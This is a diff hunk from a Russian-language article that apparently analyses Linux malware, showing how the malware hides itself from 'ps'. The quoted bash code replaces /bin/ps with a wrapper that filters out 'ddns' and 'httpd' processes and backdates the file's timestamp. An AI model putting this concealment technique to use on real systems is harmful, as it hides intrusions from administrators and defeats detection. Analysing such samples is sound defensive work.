@@ -179,9 +179,8 @@ fi
 Зато обрати внимание как он лихо скрывает своё присутствие в **ps**:
 
 ```bash
-    ...
-    mv /bin/ps /bin/ps.lanigiro 
-fi 
+...
+mv /bin/ps /bin/ps.lanigiro 
 echo "#!/bin/bash">/bin/ps
 echo "ps.lanigiro \$@ | grep -v 'ddns\|httpd'" >>/bin/ps 
 touch -d 20160825 /bin/ps
